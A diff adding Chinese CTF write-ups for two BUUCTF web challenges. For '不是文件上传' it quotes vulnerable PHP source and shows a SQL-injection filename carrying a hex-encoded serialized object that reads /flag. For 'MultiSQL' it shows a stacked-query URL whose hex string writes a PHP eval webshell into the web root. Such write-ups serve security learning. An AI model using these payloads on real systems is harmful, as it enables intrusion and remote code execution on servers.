@@ -1044,4 +1044,223 @@ echo '|'.urlencode($b);
 
 ## [安洵杯 2019]不是文件上传
 
-### 
+根据底下的 `Powered By wowouploadimage` 在 GitHub 找到源码
+
+[https://github.com/Threezh1/wowouploadimage](https://github.com/Threezh1/wowouploadimage)
+
+helper.php
+
+```php
+<?php
+class helper {
+	protected $folder = "pic/";
+	protected $ifview = False; 
+	protected $config = "config.txt";
+	// The function is not yet perfect, it is not open yet.
+
+	public function upload($input="file")
+	{
+		$fileinfo = $this->getfile($input);
+		$array = array();
+		$array["title"] = $fileinfo['title'];
+		$array["filename"] = $fileinfo['filename'];
+		$array["ext"] = $fileinfo['ext'];
+		$array["path"] = $fileinfo['path'];
+		$img_ext = getimagesize($_FILES[$input]["tmp_name"]);
+		$my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
+		$array["attr"] = serialize($my_ext);
+		$id = $this->save($array);
+		if ($id == 0){
+			die("Something wrong!");
+		}
+		echo "<br>";
+		echo "<p>Your images is uploaded successfully. And your image's id is $id.</p>";
+	}
+
+	public function getfile($input)
+	{
+		if(isset($input)){
+			$rs = $this->check($_FILES[$input]);
+		}
+		return $rs;
+	}
+
+	public function check($info)
+	{
+		$basename = substr(md5(time().uniqid()),9,16);
+		$filename = $info["name"];
+		$ext = substr(strrchr($filename, '.'), 1);
+		$cate_exts = array("jpg","gif","png","jpeg");
+		if(!in_array($ext,$cate_exts)){
+			die("<p>Please upload the correct image file!!!</p>");
+		}
+	    $title = str_replace(".".$ext,'',$filename);
+	    return array('title'=>$title,'filename'=>$basename.".".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.".".$ext);
+	}
+
+	public function save($data)
+	{
+		if(!$data || !is_array($data)){
+			die("Something wrong!");
+		}
+		$id = $this->insert_array($data);
+		return $id;
+	}
+
+	public function insert_array($data)
+	{	
+		$con = mysqli_connect("127.0.0.1","root","root","pic_base");
+		if (mysqli_connect_errno($con)) 
+		{ 
+		    die("Connect MySQL Fail:".mysqli_connect_error());
+		}
+		$sql_fields = array();
+		$sql_val = array();
+		foreach($data as $key=>$value){
+			$key_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $key);
+			$value_temp = str_replace(chr(0).'*'.chr(0), '\0\0\0', $value);
+			$sql_fields[] = "`".$key_temp."`";
+			$sql_val[] = "'".$value_temp."'";
+		}
+		$sql = "INSERT INTO images (".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
+		echo $sql;
+		mysqli_query($con, $sql);
+		$id = mysqli_insert_id($con);
+		mysqli_close($con);
+		return $id;
+	}
+
+	public function view_files($path){
+		if ($this->ifview == False){
+			return False;
+			//The function is not yet perfect, it is not open yet.
+		}
+		$content = file_get_contents($path);
+		echo $content;
+	}
+
+	function __destruct(){
+		# Read some config html
+		$this->view_files($this->config);
+	}
+}
+
+?>
+```
+
+show.php
+
+```php
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Show Images</title>
+	<link rel="stylesheet" href="./style.css">
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
+</head>
+<body>
+
+<h2 align="center">Your images</h2>
+<p>The function of viewing the image has not been completed, and currently only the contents of your image name can be saved. I hope you can forgive me and my colleagues and I are working hard to improve.</p>
+<hr>
+
+<?php
+include("./helper.php");
+$show = new show();
+if($_GET["delete_all"]){
+	if($_GET["delete_all"] == "true"){
+		$show->Delete_All_Images();
+	}
+}
+$show->Get_All_Images();
+
+class show{
+	public $con;
+
+	public function __construct(){
+		$this->con = mysqli_connect("127.0.0.1","root","root","pic_base");
+		if (mysqli_connect_errno($this->con)){ 
+   			die("Connect MySQL Fail:".mysqli_connect_error());
+		}
+	}
+
+	public function Get_All_Images(){
+		$sql = "SELECT * FROM images";
+		$result = mysqli_query($this->con, $sql);
+		if ($result->num_rows > 0){
+		    while($row = $result->fetch_assoc()){
+		    	if($row["attr"]){
+		    		$attr_temp = str_replace('\0\0\0', chr(0).'*'.chr(0), $row["attr"]);
+					$attr = unserialize($attr_temp);
+				}
+		        echo "<p>id=".$row["id"]." filename=".$row["filename"]." path=".$row["path"]."</p>";
+		    }
+		}else{
+		    echo "<p>You have not uploaded an image yet.</p>";
+		}
+		mysqli_close($this->con);
+	}
+
+	public function Delete_All_Images(){
+		$sql = "DELETE FROM images";
+		$result = mysqli_query($this->con, $sql);
+	}
+}
+?>
+
+<p><a href="show.php?delete_all=true">Delete All Images</a></p>
+<p><a href="upload.php">Upload Images</a></p>
+
+</body>
+</html>
+```
+
+insert\_array 的时候存在 sql 注入, filename 可控, 然后结合 Get\_All\_Images 时的 unserialize 来反序列化 helper 类, 利用 \_\_destruct 方法读取 flag
+
+```php
+<?php
+class helper {
+    protected $ifview = True; 
+    protected $config = "/flag";
+}
+
+echo str_replace(chr(0).'*'.chr(0),'\0\0\0',serialize(new helper()));
+
+?>
+```
+
+注意属性必须得是 protected 的, 并且 00 字符替换要按照题目代码里面的来
+
+测试发现 filename 不能存在 `/` 字符, 于是改成 hex, 即
+
+```
+123','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d);#.jpg
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231206868.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231206297.png)
+
+## [SUCTF 2018]MultiSQL
+
+查询用户信息处存在盲注
+
+```
+http://506b995f-192c-4444-b540-0908e8922e84.node4.buuoj.cn:81/user/user.php?id=2-1
+```
+
+用户名处应该也有个二次注入的, 没继续研究
+
+盲注用异或来连接, 可以读文件, 但跑的时间很长
+
+根据题目提示改成了预编译, 估计过滤了一些字符, 于是转成十六进制
+
+结合上传头像时图片保存的路径 /favicon, 猜测该目录可写 (网站根目录没有权限)
+
+直接利用预编译语句 into outfile 写 shell
+
+```
+http://506b995f-192c-4444-b540-0908e8922e84.node4.buuoj.cn:81/user/user.php?id=1;set @a=0x73656c65637420273c3f706870206576616c28245f524551554553545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f78782e70687027;prepare st from @a;execute st;
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211231238168.png)
